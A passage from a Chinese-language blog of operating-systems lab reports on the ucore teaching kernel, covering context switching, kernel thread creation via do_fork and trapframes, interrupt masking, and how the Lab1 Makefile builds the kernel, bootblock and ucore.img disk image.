class="number">4</span>(%esp), %eax          # 获取下一个进程的context结构地址</span><br><span class="line">                                # 需要注意的是，其地址不是<span class="number">8</span>(%esp)，因为之前已经pop过一次栈。</span><br><span class="line">    movl <span class="number">28</span>(%eax), %ebp         # 恢复ebp至下一个进程的context结构</span><br><span class="line">    movl <span class="number">24</span>(%eax), %edi         # 恢复edi至下一个进程的context结构</span><br><span class="line">    movl <span class="number">20</span>(%eax), %esi         # 恢复esi至下一个进程的context结构</span><br><span class="line">    movl <span class="number">16</span>(%eax), %edx         # 恢复edx至下一个进程的context结构</span><br><span class="line">    movl <span class="number">12</span>(%eax), %ecx         # 恢复ecx至下一个进程的context结构</span><br><span class="line">    movl <span class="number">8</span>(%eax), %ebx          # 恢复ebx至下一个进程的context结构</span><br><span class="line">    movl <span class="number">4</span>(%eax), %esp          # 恢复esp至下一个进程的context结构</span><br><span class="line">    pushl <span class="number">0</span>(%eax)               # 插入下一个进程的eip，以便于ret到下个进程的代码位置。</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
<p>把当前的内核栈地址换成当前执行进程的内核栈底，之所以加 KSTACKSIZE 和上面一样，proc-&gt;kstack 实际上存的是低位地址，加了 KSTACKSIZE 才是栈底，这样可以保证在每一个进程中断的时候，该进程对应的内核栈的栈底都是中断帧。</p>
<h2 id="第一个内核进程的创建"><a href="#第一个内核进程的创建" class="headerlink" title="第一个内核进程的创建"></a>第一个内核进程的创建</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建init的主线程</span></span><br><span class="line"><span class="keyword">int</span> pid = kernel_thread(init_main, <span class="string">&quot;Hello world!!&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    panic(<span class="string">&quot;create init_main failed.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 通过pid 查找proc_struct</span></span><br><span class="line">initproc = find_proc(pid);</span><br><span class="line">set_proc_name(initproc, <span class="string">&quot;init&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">kernel_thread(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">uint32_t</span> clone_flags) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">tf</span>;</span></span><br><span class="line">    <span class="comment">//在当前栈上临时分配一个tf，随后这个值会被存到新建的内核栈里</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">    tf.tf_cs = KERNEL_CS;</span><br><span class="line">    tf.tf_ds = tf.tf_es = tf.tf_ss = KERNEL_DS;</span><br><span class="line">    <span class="comment">// ebx = fn</span></span><br><span class="line">    tf.tf_regs.reg_ebx = (<span class="keyword">uint32_t</span>)fn;</span><br><span class="line">    <span class="comment">// edx = arg</span></span><br><span class="line">    tf.tf_regs.reg_edx = (<span class="keyword">uint32_t</span>)arg;</span><br><span class="line">    <span class="comment">// eip = kernel_thread_entry</span></span><br><span class="line">    tf.tf_eip = (<span class="keyword">uint32_t</span>)kernel_thread_entry;</span><br><span class="line">    <span class="keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="number">0</span>, &amp;tf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS)</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先分配一个PCB</span></span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    <span class="comment">// fork肯定存在父进程，所以设置子进程的父进程</span></span><br><span class="line">    proc-&gt;parent = current;</span><br><span class="line">    <span class="comment">// 分配内核栈（2页大小）</span></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    <span class="comment">// 将所有虚拟页数据复制过去</span></span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    <span class="comment">// 复制线程的状态，包括寄存器上下文等等</span></span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);</span><br><span class="line">    <span class="comment">// 将子进程的PCB添加进hash list或者list</span></span><br><span class="line">    <span class="comment">// 需要注意的是，不能让中断处理程序打断这一步操作</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid();</span><br><span class="line">        hash_proc(proc);</span><br><span class="line">        list_add(&amp;proc_list, &amp;(proc-&gt;list_link));</span><br><span class="line">        nr_process ++;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="comment">// 设置新的子进程可执行</span></span><br><span class="line">    wakeup_proc(proc);</span><br><span class="line">    <span class="comment">// 返回子进程的pid</span></span><br><span class="line">    ret = proc-&gt;pid;</span><br><span class="line"></span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">copy_thread(struct proc_struct *proc, <span class="keyword">uintptr_t</span> esp, struct trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line">    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="number">1</span>;</span><br><span class="line">    *(proc-&gt;tf) = *tf; <span class="comment">// 结构体整体赋值</span></span><br><span class="line">    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;tf-&gt;tf_esp = esp;</span><br><span class="line">    proc-&gt;tf-&gt;tf_eflags |= FL_IF;</span><br><span class="line"></span><br><span class="line">    proc-&gt;context.eip = (<span class="keyword">uintptr_t</span>)forkret;</span><br><span class="line">    proc-&gt;context.esp = (<span class="keyword">uintptr_t</span>)(proc-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，debug 可以发现：</p>
<p><code>(proc-&gt;kstack + KSTACKSIZE) - 1)</code> is 0xc0333fff<br><code>(struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - 1)</code> is 0xc0333fb4</p>
<p>两个地址的差刚好为一个 <code>sizeof(struct trapframe)</code> ,这表明指针强制类型转换将存储 tf 的指针往栈底抬了一个<code>sizeof(struct trapframe)</code>的大小，所以该进程对应的中断帧放在栈底是没有问题的，并没有越界。</p>
<p>经历完这一系列的初始化后，在<code>schedule</code>函数里会选中该进程去 run，调用<code>proc_run</code>中的<code>switch_to</code>，保存当前的寄存器内容到 idleproc 中的 context 中，又换 initmain 对应 context 中的 eip 来执行，即执行<code>forkret</code>函数（copy_thread 里设置的）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">forkret(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    forkrets(current-&gt;tf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.globl forkrets</span><br><span class="line">forkrets:</span><br><span class="line">    # set stack to this new process&#x27;s trapframe</span><br><span class="line">    movl <span class="number">4</span>(%esp), %esp</span><br><span class="line">    jmp __trapret</span><br><span class="line"></span><br><span class="line">.globl __trapret</span><br><span class="line">__trapret:</span><br><span class="line">    # 从中断帧中恢复所有的寄存器值</span><br><span class="line">    popal</span><br><span class="line"></span><br><span class="line">    <span class="meta"># restore %ds, %es, %fs and %gs</span></span><br><span class="line">    popl %gs</span><br><span class="line">    popl %fs</span><br><span class="line">    popl %es</span><br><span class="line">    popl %ds</span><br><span class="line"></span><br><span class="line">    <span class="meta"># get rid of the trap number and <span class="meta-keyword">error</span> code</span></span><br><span class="line">    addl $<span class="number">0x8</span>, %esp</span><br><span class="line">    iret</span><br></pre></td></tr></table></figure>
<p>这句 iret 应该会把 tf-&gt;tf_eip 当作返回地址弹出跳转到执行 kernel_thread_entry。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text.</span><br><span class="line">.globl kernel_thread_entry</span><br><span class="line">kernel_thread_entry:        <span class="meta"># void kernel_thread(void)</span></span><br><span class="line"></span><br><span class="line">    pushl %edx              <span class="meta"># push arg</span></span><br><span class="line">    call *%ebx              <span class="meta"># call fn</span></span><br><span class="line"></span><br><span class="line">    pushl %eax              <span class="meta"># save the return value of fn(arg)</span></span><br><span class="line">    call do_exit            <span class="meta"># call do_exit to terminate current thread</span></span><br></pre></td></tr></table></figure>
<p>ebx 存了要执行的函数地址 edx 存了函数参数，调用完对应的函数后取返回值 eax，最后执行 do_exit 释放进程占用资源并退出。</p>
<h2 id="tf-and-context"><a href="#tf-and-context" class="headerlink" title="tf and context"></a>tf and context</h2><p>struct context context：储存进程当前状态，用于进程切换中上下文的保存与恢复。</p>
<p>需要注意的是，与 trapframe 所保存的用户态上下文不同，context 保存的是线程的当前上下文。这个上下文可能是执行用户代码时的上下文，也可能是执行内核代码时的上下文。</p>
<p><code>struct trapframe* tf</code>：无论是用户程序在用户态通过系统调用进入内核态，还是线程在内核态中被创建，内核态中的线程返回用户态所加载的上下文就是<code>struct trapframe* tf</code>。 所以当一个线程在内核态中建立，则该新线程就必须伪造一个 trapframe 来返回用户态。</p>
<p>思考一下，从用户态进入内核态会压入当时的用户态上下文 trapframe。</p>
<p>两者关系：以 kernel_thread 函数为例，尽管该函数设置了 proc-&gt;trapframe，但在 fork 函数中的 copy_thread 函数里，程序还会设置 proc-&gt;context。两个上下文看上去好像冗余，但实际上两者所分的工是不一样的。</p>
<p>进程之间通过进程调度来切换控制权，当某个 fork 出的新进程获取到了控制流后，首当其中执行的代码是 current-&gt;context-&gt;eip 所指向的代码，此时新进程仍处于内核态，但实际上我们想在用户态中执行代码，所以我们需要从内核态切换回用户态，也就是中断返回。此时会遇上两个问题：</p>
<p>新进程如何执行中断返回？ 这就是 proc-&gt;context.eip = (uintptr_t)forkret 的用处。forkret 会使新进程正确的从中断处理例程中返回。</p>
<p>新进程中断返回至用户代码时的上下文为？ 这就是 proc_struct-&gt;tf 的用处。中断返回时，新进程会恢复保存的 trapframe 信息至各个寄存器中，然后开始执行用户代码。</p>
<h2 id="local-intr-save-and-local-intr-restore"><a href="#local-intr-save-and-local-intr-restore" class="headerlink" title="local_intr_save and local_intr_restore"></a>local_intr_save and local_intr_restore</h2><p>语句 local_intr_save(intr_flag);….local_intr_restore(intr_flag);在这里有何作用?请说明理由。</p>
<p>这两句代码的作用分别是阻塞中断和解除中断的阻塞。<br>这两句的配合，使得这两句代码之间的代码块形成原子操作，可以使得某些关键的代码不会被打断，从而避免引起一些未预料到的错误，避免条件竞争。<br>以进程切换为例，在 proc_run 中，当刚设置好 current 指针为下一个进程，但还未完全将控制权转移时，如果该过程突然被一个中断所打断，则中断处理例程的执行可能会引发异常，因为 current 指针指向的进程与实际使用的进程资源不一致。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/24/Lab1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/24/Lab1/" class="post-title-link" itemprop="url">Lab1 实验报告</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-24 10:47:34" itemprop="dateCreated datePublished" datetime="2021-01-24T10:47:34Z">2021-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-23 00:26:39" itemprop="dateModified" datetime="2021-04-23T00:26:39Z">2021-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OS/" itemprop="url" rel="index"><span itemprop="name">OS</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Lab1-实验报告"><a href="#Lab1-实验报告" class="headerlink" title="Lab1 实验报告"></a>Lab1 实验报告</h1><p><code>/labcodes_answer/lab1_result/</code> 目录下的代码，在用较新版本（好像是 GCC 5.x 开始）就会出现生成的 <code>bootloader</code> 二进制文件过大无法塞入第一个扇区的问题，这种情况只需要将 <code>/labcodes_answer/lab1_result/boot/bootmain.c</code>中的全局变量改为用宏定义即可编译通过。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> SECTSIZE  = <span class="number">512</span> ;</span><br><span class="line">改为</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTSIZE 512</span></span><br></pre></td></tr></table></figure>
<h2 id="make-生成执行文件的过程"><a href="#make-生成执行文件的过程" class="headerlink" title="make 生成执行文件的过程"></a>make 生成执行文件的过程</h2><h3 id="操作系统镜像文件-ucore-img-是如何一步一步生成的"><a href="#操作系统镜像文件-ucore-img-是如何一步一步生成的" class="headerlink" title="操作系统镜像文件 ucore.img 是如何一步一步生成的"></a>操作系统镜像文件 ucore.img 是如何一步一步生成的</h3><p>Makefile 的终极目标在第 207 行被显式指定为 205 行的 <code>TARGETS</code> ，而 <code>TARGETS</code> 的依赖为 <code>$(TARGETS)</code> ，这个变量在 Makefile 只是空的，但是会在 <code>tools/function.mk</code> 中的 <code>do_create_target</code> 宏中被修改， <code>do_create_target</code> 被函数 <code>create_target</code> 直接调用。因此在 Makefile 中只要调用了 <code>create_target</code> 就会为 <code>$(TARGETS)</code> 增添新的一项。</p>
<p>经过一系列的 <code>create_target</code> ， <code>$(TARGETS)</code> 最终值为 <code>bin/kernel bin/bootblock bin/sign bin/ucore.img</code></p>
<p>首先看<code>bin/kernel</code>的文件依赖</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(kernel)</span>: <span class="variable">$(KOBJS)</span> tools/kernel.ld</span><br><span class="line">	@echo + ld <span class="variable">$@</span></span><br><span class="line">	<span class="variable">$(V)</span><span class="variable">$(LD)</span> <span class="variable">$(LDFLAGS)</span> -T tools/kernel.ld -o <span class="variable">$@</span> <span class="variable">$(KOBJS)</span></span><br><span class="line">    <span class="comment">#最终的内核文件应该去除符号表等信息，并输出符号表信息，汇编文件信息，和输出信息</span></span><br><span class="line">	@<span class="variable">$(OBJDUMP)</span> -S <span class="variable">$@</span> &gt; <span class="variable">$(<span class="built_in">call</span> asmfile,kernel)</span></span><br><span class="line">	@<span class="variable">$(OBJDUMP)</span> -t <span class="variable">$@</span> | <span class="variable">$(SED)</span> &#x27;1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d&#x27; &gt; <span class="variable">$(<span class="built_in">call</span> symfile,kernel)</span></span><br></pre></td></tr></table></figure>
<p>显示这段代码执行的输出可以看到</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ ld bin/kernel</span><br><span class="line">ld -m elf_i386 -nostdlib -T tools/kernel.ld -o bin/kernel  obj/kern/init/init.o obj/kern/libs/readline.o obj/kern/libs/stdio.o obj/kern/debug/kdebug.o obj/kern/debug/kmonitor.o obj/kern/debug/panic.o obj/kern/driver/clock.o obj/kern/driver/console.o obj/kern/driver/intr.o obj/kern/driver/picirq.o obj/kern/trap/trap.o obj/kern/trap/trapentry.o obj/kern/trap/vectors.o obj/kern/mm/pmm.o  obj/libs/printfmt.o obj/libs/string.o</span><br></pre></td></tr></table></figure>
<p>ld 命令参数：</p>
<ul>
<li>m &lt;emulation&gt; 模拟为 i386 上的连接器</li>
<li>nostdlib 不要在标准系统目录中寻找头文件.只搜索`-I’选项指定的目录(以及当前目录,如果合适).</li>
<li>T &lt;scriptfile&gt; 让连接器使用指定的脚本</li>
</ul>
<p>所谓的<code>KOBJS</code>就是那串跟在<code>-o</code> 后面的，在<code>\lib</code>,<code>\kern</code>文件夹中所有.c .S 文件生成.o 二进制文件。通过<code>ld</code>的链接指令完成了 <code>bin/kernel</code> 文件的生成。 至于下面的的使用<code>@</code>隐藏输出的<code>OBJDUMP</code>,应该是删符号表等信息。</p>
<p>至于在<code>ld</code>命令前的.o 文件生成指令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ cc kern/init/init.c</span><br><span class="line">gcc -Ikern/init/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/init/init.c -o obj/kern/init/init.o</span><br></pre></td></tr></table></figure>
<p>gcc 参数：</p>
<ul>
<li>-fno-builtin 除非用 __builtin__ 前缀，否则不进行 builtin 函数的优化</li>
<li>-Wall 选项意思是编译后显示所有警告。</li>
<li>-ggdb 生成可供 gdb 使用的调试信息。这样才能用 qemu+gdb 来调试 bootloader or ucore。</li>
<li>-m32 生成适用于 32 位环境的代码。我们用的模拟硬件是 32bit 的 80386，所以 ucore 也要是 32 位的软件。</li>
<li>-gstabs 生成 stabs 格式的调试信息。这样要 ucore 的 monitor 可以显示出便于开发者阅读的函数调用栈信息</li>
<li>-nostdinc 不使用标准库。标准库是给应用程序用的，我们是编译 ucore 内核，OS 内核是提供服务的，所以所有的服务要自给自足。</li>
<li>-fno-stack-protector 不生成用于检测缓冲区溢出的代码。这是 for 应用程序的，我们是编译内核，ucore 内核好像还用不到此功能。</li>
<li>-I&lt;dir&gt; 添加搜索头文件的路径</li>
<li>-c Compile and assemble, but do not link.</li>
</ul>
<p>是在第 126 行左右执行的<code>$(call add_files_cc,$(call listf_cc,$(KSRCDIR)),kernel,$(KCFLAGS))</code></p>
<p>该命令对所有 kern 和 lib 下的 .c .S 文件执行了编译操作生成.o 文件。</p>
<p>紧接上面，之后的输出</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+ cc boot/bootasm.S</span><br><span class="line">gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootasm.S -o obj/boot/bootasm.o</span><br><span class="line">+ cc boot/bootmain.c</span><br><span class="line">gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootmain.c -o obj/boot/bootmain.o</span><br></pre></td></tr></table></figure>
<p>gcc 参数：</p>
<ul>
<li>-Os 为减小代码大小而进行优化。根据硬件 spec，主引导扇区只有 512 字节，我们写的简单 bootloader 的最终大小不能大于 510 字节。</li>
</ul>
<p>来自于下面两条指令</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create bootblock</span></span><br><span class="line">bootfiles = <span class="variable">$(<span class="built_in">call</span> listf_cc,boot)</span></span><br><span class="line"><span class="variable">$(<span class="built_in">foreach</span> f,<span class="variable">$(bootfiles)</span>,$(<span class="built_in">call</span> cc_compile,<span class="variable">$(f)</span>,<span class="variable">$(CC)</span>,<span class="variable">$(CFLAGS)</span> -Os -nostdinc)</span>)</span><br></pre></td></tr></table></figure>
<p>第一条语句找出<code>\boot</code>文件夹下的所有以.S .c 结尾的文件<code>bootasm.S</code>,<code>bootmain.c</code>,第二句话对上面找出的两个文件执行编译。 其中<code>bootasm.S</code>依赖于<code>\boot</code>文件夹下的的<code>asm.h</code>头文件。引入该头文件的方法是在 gcc 编译指令中加上<code>-Iboot/</code>这个参数。<code>-I&lt;dir&gt; 添加搜索头文件的路径</code>，根据这个参数可以找到位于<code>\boot</code>文件夹下的的<code>asm.h</code>头文件</p>
<p>下面的输出是对 sign 工具的编译。虽然在 makefile 文件下紧接着的是对 bootblock 的编译，但是因为 bootblock 依赖于 sign 工具，故首先执行 sign 工具的编译操作。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+ cc tools/sign.c</span><br><span class="line">gcc -Itools/ -g -Wall -O2 -c tools/sign.c -o obj/sign/tools/sign.o</span><br><span class="line">gcc -g -Wall -O2 obj/sign/tools/sign.o -o bin/sign</span><br></pre></td></tr></table></figure>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create &#x27;sign&#x27; tools</span></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> add_files_host,tools/sign.c,sign,sign)</span></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> create_target_host,sign,sign)</span></span><br></pre></td></tr></table></figure>
<p>该生成由以上两句语句生成并输出</p>
<p>解决了 sign 工具的依赖后开始生成 bootblock,输出如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+ ld bin/bootblock</span><br><span class="line">ld -m elf_i386 -nostdlib -N -e start -Ttext 0x7C00 obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o</span><br><span class="line">&#x27;obj/bootblock.out&#x27; size: 488 bytes</span><br><span class="line">build 512 bytes boot sector: &#x27;bin/bootblock&#x27; success!</span><br></pre></td></tr></table></figure>
<p>新出现的 ld 命令参数：</p>
<ul>
<li>e &lt;entry&gt; 指定入口</li>
<li>N 设置代码段和数据段均可读写</li>
<li>Ttext 制定代码段开始位置,0x7C00 就是 bios 执行完后程序开始执行的位置</li>
</ul>
<p>对应 makefile</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(bootblock)</span>: <span class="variable">$(<span class="built_in">call</span> toobj,<span class="variable">$(bootfiles)</span>)</span> | <span class="variable">$(<span class="built_in">call</span> totarget,sign)</span></span><br><span class="line">	@echo + ld <span class="variable">$@</span></span><br><span class="line">	<span class="variable">$(V)</span><span class="variable">$(LD)</span> <span class="variable">$(LDFLAGS)</span> -N -e start -Ttext 0x7C00 <span class="variable">$^</span> -o <span class="variable">$(<span class="built_in">call</span> toobj,bootblock)</span></span><br><span class="line">	@<span class="variable">$(OBJDUMP)</span> -S <span class="variable">$(<span class="built_in">call</span> objfile,bootblock)</span> &gt; <span class="variable">$(<span class="built_in">call</span> asmfile,bootblock)</span></span><br><span class="line">	@<span class="variable">$(OBJDUMP)</span> -t <span class="variable">$(<span class="built_in">call</span> objfile,bootblock)</span> | <span class="variable">$(SED)</span> &#x27;1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d&#x27; &gt; <span class="variable">$(<span class="built_in">call</span> symfile,bootblock)</span></span><br><span class="line">	@<span class="variable">$(OBJCOPY)</span> -S -O binary <span class="variable">$(<span class="built_in">call</span> objfile,bootblock)</span> <span class="variable">$(<span class="built_in">call</span> outfile,bootblock)</span></span><br><span class="line">	@<span class="variable">$(<span class="built_in">call</span> totarget,sign)</span> <span class="variable">$(<span class="built_in">call</span> outfile,bootblock)</span> <span class="variable">$(bootblock)</span></span><br></pre></td></tr></table></figure>
<p>objcopy 拷贝二进制代码 bootblock.o 到 bootblock.out:</p>
<ul>
<li>-S 移除所有符号和重定位信息</li>
<li>-O <bfdname> 指定输出格式</li>
</ul>
<p>调用 sign 进行签名（这里只显示了 sign 程序执行时的输出，并没有显示调用 sign 程序的指令）：</p>
<p><code>sign bootblock.out bootblock</code>(大概是这个意思)</p>
<p>sign 函数执行的逻辑就是在文件小于 510 个字节的情况下将最后两个字节置为 0x55AA 标志该启动扇区是合法的。</p>
<p>执行以上代码后完成 bootblock 的构造，最后执行 ucore.img 的构造</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero of=bin/ucore.img count=10000</span><br><span class="line"></span><br><span class="line">10000+0 records in</span><br><span class="line">10000+0 records out</span><br><span class="line">5120000 bytes (5.1 MB) copied, 0.0213187 s, 240 MB/s</span><br><span class="line"></span><br><span class="line">dd if=bin/bootblock of=bin/ucore.img 